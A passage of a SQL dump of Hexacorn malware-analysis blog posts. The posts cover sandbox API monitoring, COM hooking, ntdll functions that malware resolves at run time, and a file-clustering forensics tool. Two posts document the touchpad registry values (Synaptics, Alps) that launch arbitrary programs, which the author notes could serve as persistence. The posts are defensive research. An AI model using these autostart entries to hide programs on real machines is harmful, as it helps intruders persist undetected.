etc.\nFor a reverser, seeing native functions being used by malware is typically a good news i.e. it means an interesting work; that means that someone on the other side of the fence at least made an effort to be creative and most likely wrote the code either in asm, or in C. Copy & paste exists of course too (and also ported to very high-level languages), but I’d argue that on a much smaller scale and mainly used by wrappers.\nThe code of malware families that leverage native functions is interesting not only for their functionality or technical craftsmanship, but also for the simple reason that being the creation of their intelligent authors it is probably the most personal code you will see in the software world (as juxtaposed by copy&paste efforts that is present all over the place f.ex. inside POS malware, but also in regular software which nowadays heavily relies on copy&paste from Stack Overflow). I could summarize this paragraph by saying that creative malware writers typically use native functions, and from a different angle – if you are looking for an interesting malware – look for the one that is using the native functions.\nThe post wouldn’t be complete if we didn’t list some of the most popular ntdll functions that are resolved during run-time (i.e. via GetProcAddress):\nLdrFindEntryForAddress\nNtUnmapViewOfSection\nNtQuerySystemInformation\nZwQueryInformationThread\nRtlInitUnicodeString\nZwUnmapViewOfSection\nRtlNtStatusToDosError\nNtMapViewOfSection\nNtOpenSection\nNtQueryInformationProcess\nRtlAllocateHeap\nRtlDecompressBuffer\nRtlFreeHeap\nRtlEnterCriticalSection\nRtlLeaveCriticalSection\nRtlGetLastWin32Error\nRtlReAllocateHeap\nRtlDeleteCriticalSection\nLdrLoadDll\nCsrGetProcessId\nLdrGetDllHandle\nRtlSetLastWin32Error\nNtSetInformationProcess\nRtlAddVectoredExceptionHandler\nRtlImageNtHeader\nLdrGetProcedureAddress\nNtCreateThread\nRtlAdjustPrivilege\nRtlUnwind\nLdrFindEntryForAddress\nNtSetInformationThread\nmemset\nVerSetConditionMask\nNtUnmapViewOfSection\nRtlRemoveVectoredExceptionHandler\nmemcpy\nZwClose\nZwQueryInformationProcess\nNtCreateUserProcess\nNtAllocateVirtualMemory\nRtlUserThreadStart\nZwOpenProcess\nNtWriteVirtualMemory\nZwQuerySystemInformation\nNtClose\nNtReadVirtualMemory\nRtlImageDirectoryEntryToData\nNtDelayExecution\nswprintf\nRtlSizeHeap\nShare this :)', 'Batch Analysis, Clustering, Malware Analysis, Sandboxing', 'http://www.hexacorn.com/blog/2015/06/10/enter-sandbox-part-3-if-you-see-native-code-is-creative/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (231, 'Permanent Link to Enter Sandbox – part 2: COM, babe COM', 'Hexacorn', 'June 9, 2015 ', 'API hooking, or interception described in part 1 is great for many analysis and works very well for many older generic samples, but to be able to handle modern samples sandbox needs to handle Component Object Model (COM) as well. COM is a bitch when it comes to analysis and hooking, because it’s omnipresent, not everything is properly documented, there are lots of ways to do the same thing and funnily enough – developers using COM make lots of mistakes and often incorrectly reference pointers. While their apps crash internally and exceptions are handled by the respective frameworks any intrusive sandbox will typically crash the application if it is not prepared to handle programmers’ mistakes.\nWhen I say that the same thing can be done in many ways it’s for a simple reason. While COM objects are typically instantiated using e.g. CoCreateInstance, CoCreateInstanceEx, CoGetClassObject, or by actually calling some COM methods there is also a myriad of ‘regular’ APIs that can also instantiate COM objects – a simple example is PStoreCreateInstance.\nCOM is quite a mess and the deeper you dig the more weird stuff you will find (f.ex. interfaces changing names over time messing up your collection of CLSIDs).\nGood luck handling it all…\nHooking COM objects requires either manipulating original virtual tables that are hidden inside the code/data of the COM object provider or dynamically – only inside the buffers allocated for instantiated objects. Whatever way, it sometimes is not welcome by the hooked applications which may have a code implemented to prevent COM hooking (I have seen this). Non-invasive interception is possible as well, but requires good tracking mechanism – some samples can call COM many times during the analysis session.\nIf you read that far you may be wondering, what COM objects we could hook and why it really matters?\nNowadays many malicious apps use various evasions, and lots of them are implemented using COM. A simple example is IBackgroundCopyJob used by FinFisher and attempting to copy files under the noses of sandboxes/AV. COM is also used to create/modify shortcuts, download stuff in a background using Background Intelligent Transfer Service (BITS) and other interfaces – and you may _not_ get to see URLs/domains contacted if you only rely on API hooking. Last, but not least – popular evasions rely on enumerating various properties using WMI and these are also handled via COM.\nNot hooking this stuff leaves a lot of unanswered questions and limits the actionable data that can be extracted from the session.\nThis is an example of COM hooking in action:\n\nUsing ShellLink to create a shortcut file\n\nCoCreateInstanceEx (ShellLink, IShellLinkA)\nIShellLinkA::SetPath (%SYSTEM%\\malware.exe)\nIPersistFile::Save (C:\\Documents and Settings\\user\\Start Menu\\Programs\\malware.lnk)\n\n\nUsing web browser object to download stuff\n\nIWebBrowser2::Navigate (URL=http://xx.xx.xx.xx/media/1,Flags=,TargetFrameName=,PostData=,Headers=)\n\n\nUsing WMI to enumerate processes\n\nIWbemLocator::ConnectServer (strNetworkResource=root\\cimv2, user=, password=, locale=)\nIWbemServices::ExecQuery (strQueryLanguage=WQL, Query=SELECT __PATH, ProcessId, CSName, Caption, SessionId, ThreadCount, WorkingSetSize, KernelModeTime, UserModeTime, ParentProcessId FROM Win32_Process)\n\n\n\nShare this :)', 'Batch Analysis, Clustering, Malware Analysis', 'http://www.hexacorn.com/blog/2015/06/09/enter-sandbox-part-2-com-babe-com/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (232, 'Permanent Link to Beyond good ol’ Run key, Part 31', 'Hexacorn', 'May 29, 2015 ', 'The last piece in the series talked about Synaptics software – a program to manage the touchpad on some of the popular laptops (e.g. from Toshiba).\nTurns out Synaptics is not the only company providing a software managing the touchpad extensions and this short post introduces yet another one – from Alps company. The relationship between these two aforementioned companies seems to be actually quite close; I have not investigated it very thoroughly, but if you google these two, you will find a lot of overlaps; I personally don’t care too much – at the end of the day they both use different Registry entries, and this is all that matters ;).\nSo, anyways, Alps touchpads can be found on many popular laptops e.g. from Dell and Toshiba. Here, I will talk about the Dell version.\nLooking at available options we can easily find the familiar ‘Run’ command that can be associated with buttons’ activities:\nA simple test (Run Notepad when we click Left button on the touchpad) allows us to quickly discover the location in the Registry where the settings are stored:\nThe key is located under HKCU:\n\nHKEY_CURRENT_USER\\Software\\Alps\n\nand the specific settings for buttons are located at:\n\nHKEY_CURRENT_USER\\Software\\Alps\\Apoint\\Button\n\nwhere:\n\nAppReg1 = <path to executable>\nButtonFunction1 = 0x1b to run the program (while default=0x5 means simply ‘Click’)\n\n(this is for the Left button specifically – other buttons use consecutive numbers i.e. AppReg2, AppReg3; ButtonFunction2, ButtonFunction3)\nAgain, it’s more  a curiosity than a real threat, but still good to have it documented, even if that briefly \nIf you know any other software like this, and can send me screenshots/reg entries I will be forever grateful  Thanks in advance.\nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2015/05/29/beyond-good-ol-run-key-part-31/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (233, 'Permanent Link to Enter Sandbox – part 1: All APIs are equal, but some APIs are more equal than othe', 'Hexacorn', 'May 29, 2015 ', 'I am going to start a new series about sandbox and sandbox evasions. I will utilize data I gathered over last 10 years together with an experience of actually getting my hands dirty and coding my own monitor from the scratch. I actually never considered it a real sandbox, as it does way much more, but I’ll use ‘sandbox’ here, cuz everyone already knows what it is.\nCreating a good sandbox is a very challenging task. Not only it’s technically challenging, but you also need to be very selective. One such area where you have to be really specific about what you do is a list of APIs that you need to intercept, because:\n\nif you miss some – you may lose vital information from the report, or fail to intercept one of many ‘escape’ mechanisms that modern malware utilizes for evasion purposes (heaven’s gate, tricks to launch code under a different process while at the same time fooling the sandbox/av monitor that nothing is going on, etc.)\nif you monitor too much – you will get a headache trying to understand the output\n\nThere are many ‘schools’ of what to intercept. Some people prefer kernel-mode hooks and monitor stuff on a high-level (or, a low-level, depending where we observe it from). They ‘see’ everything, but they miss context of the execution (process, thread, window procedure, etc.). The user-mode monitoring fans are better off when it comes to the context, but they may miss the more complex stuff. In some approaches the monitoring of APIs/services is also supported by extra checks e.g. $MFT, Registry analysis pre- and post-session, and outside-sandbox analysis of disk/file system/memory. Plus, of course network stuff.\nI am personally a big fan of user-mode only monitoring. It worked for me for last 10 years pretty well, and while it may miss stuff I believe that wherever evasive or kernel mode stuff is involved you need to simply get your hands dirty and do manual analysis. This btw. is actually the fun part of the malware analyst job \nNote: I am mainly talking about the manual, in-depth analysis of malware and not general-purpose sandbox that is commercially ‘required’ to ‘see’ it all. This is actually quite a headache to manage and I do not envy sandbox companies that need to worry about it.\nOkay. So, if we focus on user-mode monitoring we definitely need to know what to monitor.\nOne approach that can be taken to figure out what APIs to monitor is…very naive statistics – naive, because based on a simple principle and this is the topic I will cover today.\nMost of malware nowadays is either packed, or somehow protected. Once it executes, the wrapper launches the actual payload and during this phase it often resolves the APIs. Later on it may inject stuff into other processes, some more APIs may get resolved, and so on and so forth. It can get pretty messy.\nNow, there are plenty of methods to resolve the APIs including leveraging the GetProcAddress and/or LdrGetProcedureAddress, or simply walking through the export tables of respective libraries and finding the required API addresses. You can also do pattern searching, brute-force and some fancy algorithmic API address discovery, but these are exotic cases and we don’t need to care for them.\nI mentioned that this is going to be about naive statistics  – this is why we will only look at GetProcAddress. All we need is data.\nAs long as we execute a large number of samples while we monitor this particular API we can get a nice, and quite a fair representation of popularity of certain APIs. These APIs need to be screened manually and then a subset of them can be selected for monitoring.\nSo, looking at results of 150K+ sandboxed samples I came up with the following list of APIs (top 100 are listed):\nKERNEL32.dll    CloseHandle\nKERNEL32.dll    WriteFile\nKERNEL32.dll    GetModuleHandleA\nKERNEL32.dll    ExitProcess\nKERNEL32.dll    GetLastError\nKERNEL32.dll    VirtualAlloc\nKERNEL32.dll    GetProcAddress\nKERNEL32.dll    VirtualFree\nKERNEL32.dll    Sleep\nKERNEL32.dll    LoadLibraryA\nKERNEL32.dll    SetFilePointer\nKERNEL32.dll    ReadFile\nKERNEL32.dll    CreateFileA\nKERNEL32.dll    WaitForSingleObject\nKERNEL32.dll    GetModuleFileNameA\nKERNEL32.dll    FlsFree\nKERNEL32.dll    FlsGetValue\nKERNEL32.dll    FlsSetValue\nKERNEL32.dll    FlsAlloc\nKERNEL32.dll    MultiByteToWideChar\nKERNEL32.dll    GetTickCount\nKERNEL32.dll    FreeLibrary\nKERNEL32.dll    CreateThread\nKERNEL32.dll    FindClose\nKERNEL32.dll    GetFileSize\nKERNEL32.dll    GetCurrentProcess\nKERNEL32.dll    GetCurrentThreadId\nKERNEL32.dll    HeapAlloc\nKERNEL32.dll    WideCharToMultiByte\nADVAPI32.dll    RegCloseKey\nKERNEL32.dll    GetCurrentProcessId\nKERNEL32.dll    GetStdHandle\nKERNEL32.dll    HeapFree\nKERNEL32.dll    VirtualProtect\nKERNEL32.dll    DeleteCriticalSection\nUSER32.dll    GetSystemMetrics\nKERNEL32.dll    LoadResource\nKERNEL32.dll    LeaveCriticalSection\nKERNEL32.dll    GetCommandLineA\nKERNEL32.dll    InitializeCriticalSection\nKERNEL32.dll    EnterCriticalSection\nKERNEL32.dll    GlobalAlloc\nKERNEL32.dll    LocalFree\nKERNEL32.dll    OpenProcess\nKERNEL32.dll    TerminateProcess\nKERNEL32.dll    LockResource\nKERNEL32.dll    SizeofResource\nKERNEL32.dll    DeleteFileA\nKERNEL32.dll    GetModuleFileNameW\nKERNEL32.dll    SetLastError\nKERNEL32.dll    SetEndOfFile\nKERNEL32.dll    RtlUnwind\nKERNEL32.dll    GetProcessHeap\nKERNEL32.dll    GetStartupInfoA\nKERNEL32.dll    GlobalFree\nKERNEL32.dll    TlsSetValue\nKERNEL32.dll    DeleteFileW\nKERNEL32.dll    TlsGetValue\nKERNEL32.dll    CreateFileW\nKERNEL32.dll    lstrlenA\nKERNEL32.dll    GetModuleHandleW\nKERNEL32.dll    GetSystemTimeAsFileTime\nKERNEL32.dll    GlobalUnlock\nKERNEL32.dll    CreateProcessA\nKERNEL32.dll    InterlockedDecrement\nKERNEL32.dll    SetUnhandledExceptionFilter\nKERNEL32.dll    SetEvent\nKERNEL32.dll    DecodePointer\nKERNEL32.dll    IsProcessorFeaturePresent\nKERNEL32.dll    LocalAlloc\nKERNEL32.dll    UnhandledExceptionFilter\nKERNEL32.dll    GlobalLock\nKERNEL32.dll    SetFileTime\nKERNEL32.dll    RaiseException\nKERNEL32.dll    CreateMutexA\nKERNEL32.dll    SetErrorMode\nKERNEL32.dll    FindFirstFileA\nKERNEL32.dll    ResumeThread\nKERNEL32.dll    EncodePointer\nKERNEL32.dll    InterlockedIncrement\nKERNEL32.dll    GetTempPathA\nKERNEL32.dll    GetFileType\nADVAPI32.dll    RegOpenKeyExA\nKERNEL32.dll    GetACP\nKERNEL32.dll    GetVersionExA\nKERNEL32.dll    CreateToolhelp32Snapshot\nKERNEL32.dll    GetCPInfo\nKERNEL32.dll    GetFileAttributesW\nUSER32.dll    GetMonitorInfoA\nKERNEL32.dll    SystemTimeToFileTime\nUSER32.dll    MessageBoxA\nKERNEL32.dll    GetVersion\nKERNEL32.dll    IsDebuggerPresent\nUSER32.dll    EnumDisplayMonitors\nKERNEL32.dll    FlushFileBuffers\nKERNEL32.dll    GetTempPathW\nKERNEL32.dll    lstrcpyA\nKERNEL32.dll    HeapReAlloc\nKERNEL32.dll    ReleaseMutex\nKERNEL32.dll    TlsAlloc\n \nShare this :)', 'Batch Analysis, Clustering, Malware Analysis', 'http://www.hexacorn.com/blog/2015/05/29/enter-sandbox-part-1-all-api-are-equal-but-some-apis-are-more-equal-than-others/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (234, 'Permanent Link to Beyond good ol’ Run key, Part 30', 'Hexacorn', 'April 26, 2015 ', 'Many laptops come with preinstalled packages that enhance user experience by responding to gestures and shortcuts available via a touchpad. One of the most popular packages offering such functionality comes from Synaptics. My old laptop has it preinstalled as well and… that’s how this post was born.\nWhile exploring the options of the program I discovered that you can associate a lot of various actions with buttons and areas/zones of the touchpad. Turns out that one such interesting action is… running an arbitrary program \nClicking the Configure button allows us to choose the path to the program:\nSame goes for the right button (and also zones shown at the bottom of the left pane):\nOnce I configured these I was able to launch the program of my choice by just playing with the touchpad.\nI must mention that it is not a vulnerability – it is just a flexibility offered by the program allowing user to define what they want to do with their computer. But of course it could be abused as a persistence mechanism.\nThe place in the Registry where these paths are stored is shown below:\n\nHKCU\\Software\\Synaptics\\SynTPEnh\\PlugInConfig\\TouchPadPS2\n\nThe information about what action should be triggered is stored here:\n\nHKCU\\Software\\Synaptics\\SynTP\\TouchPadPS2\n\nLeftButtonAction = if equal 0 the default touchpad action is overridden with the action of the plugin defined by the next 2 entries below (LeftButtonPlugInID & LeftButtonPlugInActionID)\nLeftButtonPlugInID = changed to ‘SynTP’\nLeftButtonPlugInActionID = if this ActionID is equal to 5 then it is program execution\n\n\n\nRight button (and other buttons, if present)  as well as zones all have similar set of settings (again, their actual availability depends on a touchpad model/hardware/); the respective registry entries are:\n\nTopLeftCornerPlugInID=\nTopRightCornerPlugInID=\nBottomLeftCornerPlugInID=\nBottomRightCornerPlugInID=\nLeftButtonPlugInID=\nMiddleButtonPlugInID=\nRightButtonPlugInID=\nUpButtonPlugInID=\nDownButtonPlugInID=\n2FingerTapPlugInID=\n3FingerTapPlugInID=\nExButton1PlugInID=\nExButton2PlugInID=\nExButton3PlugInID=\nExButton4PlugInID=\nExButton5PlugInID=\nExButton6PlugInID=\nExButton7PlugInID=\nExButton8PlugInID=\nPressToSelectPlugInID=\nButton5PlugInID=\nButtonModePlugInID=\n3FingerPressPlugInID=\nPalmOnPadPlugInID=\n2FingerDoubleTapPlugInID=\n\nand each of them have the respective ‘ActionID’ settings e.g.:\n\nTopRightCornerPlugInID -> TopRightCornerPlugInActionID\n\nThe chance we will come across it on real cases are pretty low, but just adding it here for completeness.\nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2015/04/26/beyond-good-ol-run-key-part-30/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (235, 'Permanent Link to Introducing filighting and the future of DFIR tools, part 3 – more examples', 'Hexacorn', 'April 11, 2015 ', 'I have been toying around with the script trying it on various folders and the results are quite promising.\nHere is a bunch of examples – screenshots + interactive demos. Note that some JSON files may take a long time to load so please be patient.\n\nOpera 26\n\nQuite a nice graph – all files had at least one reference\n\n\n\n\n\nFirefox 35\n\nQuite a nice graph as well – all files had at least one reference\n\n\n\n\n\nOffice 15\n\nThere is so many files that it is not very readable\nBUT out of 3K+ files, only 17 didn’t have any reference!\n\n\n\n\n\nNotepad ++\n\nProbably the worst case I have seen so far – lots of clusters and orphaned files\n\n\n\n\n\nVMWare 11\n\nNot too bad, lot of files are referenced, just a few stand out\n\n\n\n\nShare this :)', 'Clustering, Forensic Analysis, Visualisation', 'http://www.hexacorn.com/blog/2015/04/11/introducing-filighting-and-the-future-of-dfir-tools-part-3-more-examples/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (236, 'Permanent Link to Introducing filighting and the future of DFIR tools, part 2', 'Hexacorn', 'April 11, 2015 ', 'In my yesterday’s post I described a simple clustering algorithm that could be used to group files that contain references to each other. Today I am posting the source code of the program that generated the data in my last post, together with a demo that shows how powerful such clustering could be if combined with proper visualization techniques.\nIn the example I have shown, I used a relatively small folder where Total Commander was installed. The resulting cluster looks like this:\nYou can play with it interactively here.\nImagine that someone adds files to the Total Commander folder. Since they are not referenced by any other file in this folder, they will create separate clusters. After adding 3 such files:\n\norphan1.txt\norphan2.txt\norphan3.txt\n\nwe get the following clusters:\nYou can play with it interactively here (you need to drag the orphans away to get the same result as shown on the screenshot).\nFinally, we can imagine that a hacker of malware creates a couple of files that are perhaps referencing each other. An example could be:\n\nconfig.bin\nkeystrokes.txt\nmalware.exe – referencing keystrokes.txt and config.bin\n\nIf we now cluster this directory, we will get something like this:\nThe ‘malware’ files clearly stand out.\nYou can play with it interactively here (again, you need to drag the nodes away to get the same result as shown on the screenshot).\nFor more examples see part 3.\nI believe there is a lot of opportunities in leveraging clustering to reduce the amount of data we need to analyze and to improve user experience by introducing new ways to look at data. There are a lot of visualization techniques that are not used in forensic software today and it is a pity. Clustering adds an extra dimension on top of a timeline and structure imposed by the organization of a file system – we can only hope that forensic software of the future will take this into account.\nFor inspiration and really amazing examples of visualization go to https://github.com/mbostock/d3/wiki/Gallery. I used the very same script to create the interactive demos referenced by this post.\nThe source code of the filighter script that generates these clusters is here.\nShare this :)', 'Clustering, Forensic Analysis, Software Releases, Visualisation', 'http://www.hexacorn.com/blog/2015/04/11/introducing-filighting-and-the-future-of-dfir-tools-part-2/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (237, 'Permanent Link to Introducing filighting and the future of DFIR tools', 'Hexacorn', 'April 10, 2015 ', 'Filighting (FIle highLIGHTING) is a proof of concept idea that I implemented in perl as a naive clustering and data reduction algorithm modeled on the way software is built on Windows platform.\nTL;DR; The algo is as follows:\n\nenumerate all the files in a directory\nread all the files one by one and try to see if any of them contain actual references to other files\ncross-reference these\nprofit\n\nYup. It’s that simple.\nHow Windows Software is built?\nWindows software can be built in many ways, using various programming languages, platforms and frameworks.\nFor the purpose of this post we will focus on the most typical software packages that contain a couple of components:\n\nMain program file – the actual program – portable executable (.exe)\nAdditional executable files – typically libraries, but sometimes other .exe and kernel mode drivers (.exe, .dll, .sys, .ocx, etc.)\nLocalization/Language files (e.g. .lng, .mui, etc.)\nConfiguration files (.cfg, etc.)\nTemplates (.template, .theme, etc.)\nDatabases (.db, .sql, etc.)\nReadme files, Help files (.txt, .hlp, etc.)\nGFX files (.jpg, .png, etc.)\nPlug-ins (.dll, etc.)\nand whatever else that is required for the program to offer some functionality\n+ Registry entries (which I skip in this post)\n\nNotably, there are programs that are basically a single executable – many OS programs used to be just simple .exe f.ex. Notepad.exe, or Calc.exe. In newer versions of Windows they rely on additional localization files ( .mui), or are just links to other programs f.ex. Calc.exe on Windows 10 linking to a Metro application. While the programs that are just single executables are not the focus of this post, they certainly could be highlighted as possible ‘orphans’ by the very same algorithm, or its spin-offs.\nOkay, what can we do with this knowledge?\nKnowing that software contains many files gives us a hint that there must be some links between them all that are somehow established during the compilation, installation, or program use phases.\n\nThe building process may compile hardcoded file names into the final main program file and/or its libraries, configuration files, etc..\nThe installation program drops the files in respective folders and creates configuration files, registry entries, etc.\nThe program use is the activity that user or application performs and it affects how the files are created, added, modified, etc.\n\nWhile it is hard to keep a track of it all, it certainly makes sense to try to imagine these interconnections and attempt to create a hidden graph that connects all these components together.\nIt is also tempting to imagine that recognizing these connections would allow us to cluster files into buckets that could be then hidden from the ‘view’ during analysis!\nThis is not an easy thing to do for the whole file system, but it works pretty well for selected case-scenarios and in particular – directories. And there is really a lot of ways to improve this especially if file format is considered and links not only between files, but also between files and the Registry are considered.\nAs usual: subject to a further research!\nWeaknesses\nIt’s very easy to abuse it. You just need to drop files that self-reference each other and to make it even more tricky, reference ‘good’ files on the system.\nInstallations that cover more than one folder are also problematic (‘Common Files’ subfolder is a good example for ‘multi-folder’ installation).\nProtected files – usually compressed, virtualized main program executable files won’t reveal references to other files.\nThere are probably more…\nStill… I do believe this is the future of DFIR tools, even if the possible implementations may vary a lot from the idea I am discussing here.\n‘Known hashes’ is good.\n‘Known hashes+files’ is good+.\nTime for a simple example\nOkay, just writing about stuff is not enough.\nLet’s see how it works in practice.\nIn this test I install Total Commander – the latest 32-bit version from http://www.ghisler.com/download.htm\nOnce installed, the installation folder contains the following list of files:\n\nCABRK.DLL\nCGLPT64.SYS\nCGLPT9X.VXD\nCGLPTNT.SYS\nDEFAULT.BAR\nDESCRIPT.ION\nFRERES32.DLL\nHISTORY.TXT\nKEYBOARD.TXT\nNO.BAR\nNOCLOSE.EXE\nREGISTER.RTF\nSFXHEAD.SFX\nSHARE_NT.EXE\nSIZE!.TXT\nTC7Z.DLL\nTC7ZIPIF.DLL\nTCMADMIN.EXE\nTCMDLZMA.DLL\nTCMDX64.EXE\nTCUNINST.EXE\nTCUNINST.WUL\nTCUNZLIB.DLL\nTcUsbRun.exe\nTOTALCMD.CHM\nTOTALCMD.EXE\nTOTALCMD.EXE.MANIFEST\nTOTALCMD.INC\nUNACEV2.DLL\nUNRAR.DLL\nUNRAR9X.DLL\nWC32TO16.EXE\nWCMICONS.DLL\nWCMICONS.INC\nWCMZIP32.DLL\nWCUNINST.WUL\nwcx_ftp.ini\nwincmd.ini\nLANGUAGE\\WCMD_CHN.INC\nLANGUAGE\\WCMD_CHN.LNG\nLANGUAGE\\WCMD_CHN.MNU\nLANGUAGE\\WCMD_CZ.INC\nLANGUAGE\\WCMD_CZ.LNG\nLANGUAGE\\WCMD_CZ.MNU\nLANGUAGE\\WCMD_DAN.INC\nLANGUAGE\\WCMD_DAN.LNG\nLANGUAGE\\WCMD_DAN.MNU\nLANGUAGE\\WCMD_DEU.INC\nLANGUAGE\\WCMD_DEU.LNG\nLANGUAGE\\WCMD_DEU.MNU\nLANGUAGE\\WCMD_DUT.INC\nLANGUAGE\\WCMD_DUT.LNG\nLANGUAGE\\WCMD_DUT.MNU\nLANGUAGE\\WCMD_ENG.MNU\nLANGUAGE\\WCMD_ESP.INC\nLANGUAGE\\WCMD_ESP.LNG\nLANGUAGE\\WCMD_ESP.MNU\nLANGUAGE\\WCMD_FRA.INC\nLANGUAGE\\WCMD_FRA.LNG\nLANGUAGE\\WCMD_FRA.MNU\nLANGUAGE\\WCMD_HUN.INC\nLANGUAGE\\WCMD_HUN.LNG\nLANGUAGE\\WCMD_HUN.MNU\nLANGUAGE\\WCMD_ITA.INC\nLANGUAGE\\WCMD_ITA.LNG\nLANGUAGE\\WCMD_ITA.MNU\nLANGUAGE\\WCMD_KOR.INC\nLANGUAGE\\WCMD_KOR.LNG\nLANGUAGE\\WCMD_KOR.MNU\nLANGUAGE\\WCMD_NOR.LNG\nLANGUAGE\\WCMD_NOR.MNU\nLANGUAGE\\WCMD_POL.LNG\nLANGUAGE\\WCMD_POL.MNU\nLANGUAGE\\WCMD_ROM.INC\nLANGUAGE\\WCMD_ROM.LNG\nLANGUAGE\\WCMD_ROM.MNU\nLANGUAGE\\WCMD_RUS.INC\nLANGUAGE\\WCMD_RUS.LNG\nLANGUAGE\\WCMD_RUS.MNU\nLANGUAGE\\WCMD_SK.LNG\nLANGUAGE\\WCMD_SK.MNU\nLANGUAGE\\WCMD_SVN.INC\nLANGUAGE\\WCMD_SVN.LNG\nLANGUAGE\\WCMD_SVN.MNU\nLANGUAGE\\WCMD_SWE.LNG\nLANGUAGE\\WCMD_SWE.MNU\n\nThis is quite a lot of files. If you come across it during exam, you won’t be able to tell which ones are legit and which are not. You need to browse through it all. It takes a lot of human cycles away.\nUsing a simple script which implements the aforementioned algo I was able to generate the following list of links established between all these files (files are sorted in order of ‘what file is the most popular’, or – in other words – ‘which file is referenced by others the most frequently’:\n\nwcmzip32.dll 21\n\nDESCRIPT.ION\nHISTORY.TXT\nWCMD_CHN.LNG\nWCMD_CZ.LNG\nWCMD_DAN.LNG\nWCMD_DEU.LNG\nWCMD_DUT.LNG\nWCMD_ESP.LNG\nWCMD_FRA.LNG\nWCMD_HUN.LNG\nWCMD_ITA.LNG\nWCMD_KOR.LNG\nWCMD_NOR.LNG\nWCMD_POL.LNG\nWCMD_ROM.LNG\nWCMD_RUS.LNG\nWCMD_SK.LNG\nWCMD_SVN.LNG\nWCMD_SWE.LNG\nTCUNINST.WUL\nTOTALCMD.EXE\n\n\ntcuninst.exe 20\n\nDESCRIPT.ION\nHISTORY.TXT\nWCMD_CHN.LNG\nWCMD_CZ.LNG\nWCMD_DAN.LNG\nWCMD_DEU.LNG\nWCMD_DUT.LNG\nWCMD_ESP.LNG\nWCMD_FRA.LNG\nWCMD_HUN.LNG\nWCMD_ITA.LNG\nWCMD_KOR.LNG\nWCMD_NOR.LNG\nWCMD_POL.LNG\nWCMD_ROM.LNG\nWCMD_RUS.LNG\nWCMD_SK.LNG\nWCMD_SVN.LNG\nWCMD_SWE.LNG\nTOTALCMD.EXE\n\n\ndescript.ion 18\n\nHISTORY.TXT\nWCMD_CHN.LNG\nWCMD_DEU.LNG\nWCMD_DUT.LNG\nWCMD_ESP.LNG\nWCMD_FRA.LNG\nWCMD_HUN.LNG\nWCMD_ITA.LNG\nWCMD_KOR.LNG\nWCMD_NOR.LNG\nWCMD_POL.LNG\nWCMD_ROM.LNG\nWCMD_RUS.LNG\nWCMD_SK.LNG\nWCMD_SVN.LNG\nWCMD_SWE.LNG\nTCUNINST.WUL\nTOTALCMD.EXE\n\n\ntotalcmd.inc 14\n\nDESCRIPT.ION\nHISTORY.TXT\nWCMD_CHN.INC\nWCMD_CZ.INC\nWCMD_DAN.INC\nWCMD_DEU.INC\nWCMD_FRA.INC\nWCMD_FRA.LNG\nWCMD_HUN.INC\nWCMD_KOR.INC\nWCMD_ROM.LNG\nWCMD_RUS.INC\nTCUNINST.WUL\nTOTALCMD.EXE\n\n\nwcx_ftp.ini 6\n\nHISTORY.TXT\nWCMD_CZ.LNG\nWCMD_RUS.LNG\nWCMD_SK.LNG\nTCUNINST.EXE\nTOTALCMD.EXE\n\n\nnoclose.exe 5\n\nDESCRIPT.ION\nHISTORY.TXT\nKEYBOARD.TXT\nTCUNINST.WUL\nTOTALCMD.EXE\n\n\nunrar.dll 5\n\nDESCRIPT.ION\nHISTORY.TXT\nTCUNINST.WUL\nTOTALCMD.EXE\nUNRAR9X.DLL\n\n\ntotalcmd.exe 5\n\nDESCRIPT.ION\nHISTORY.TXT\nTCUNINST.EXE\nTCUNINST.WUL\nTcUsbRun.exe\n\n\ntc7z.dll 4\n\nDESCRIPT.ION\nTC7ZIPIF.DLL\nTCUNINST.WUL\nTOTALCMD.EXE\n\n\nsfxhead.sfx 4\n\nDESCRIPT.ION\nHISTORY.TXT\nTCUNINST.WUL\nTOTALCMD.EXE\n\n\ntcmdx64.exe 4\n\nDESCRIPT.ION\nHISTORY.TXT\nTCUNINST.WUL\nTOTALCMD.EXE\n\n\nwcmicons.dll 4\n\nDEFAULT.BAR\nDESCRIPT.ION\nTCUNINST.WUL\nTOTALCMD.EXE\n\n\ncglptnt.sys 4\n\nCGLPT64.SYS\nDESCRIPT.ION\nHISTORY.TXT\nTCUNINST.WUL\n\n\ntcmadmin.exe 4\n\nDESCRIPT.ION\nHISTORY.TXT\nTCUNINST.WUL\nTOTALCMD.EXE\n\n\nunrar9x.dll 4\n\nDESCRIPT.ION\nHISTORY.TXT\nTCUNINST.WUL\nTOTALCMD.EXE\n\n\ntcunzlib.dll 4\n\nDESCRIPT.ION\nHISTORY.TXT\nTCUNINST.WUL\nTOTALCMD.EXE\n\n\ntcusbrun.exe 3\n\nDESCRIPT.ION\nHISTORY.TXT\nTCUNINST.WUL\n\n\nfreres32.dll 3\n\nDESCRIPT.ION\nTCUNINST.WUL\nTOTALCMD.EXE\n\n\nshare_nt.exe 3\n\nDESCRIPT.ION\nTCUNINST.WUL\nTOTALCMD.EXE\n\n\ncabrk.dll 3\n\nDESCRIPT.ION\nTCUNINST.WUL\nTOTALCMD.EXE\n\n\nwc32to16.exe 3\n\nDESCRIPT.ION\nTCUNINST.WUL\nTOTALCMD.EXE\n\n\nwincmd.ini 3\n\nHISTORY.TXT\nTCUNINST.EXE\nTOTALCMD.EXE\n\n\ndefault.bar 3\n\nDESCRIPT.ION\nTCUNINST.WUL\nTOTALCMD.EXE\n\n\ntc7zipif.dll 3\n\nDESCRIPT.ION\nTCUNINST.WUL\nTOTALCMD.EXE\n\n\nunacev2.dll 3\n\nDESCRIPT.ION\nTCUNINST.WUL\nTOTALCMD.EXE\n\n\ntcmdlzma.dll 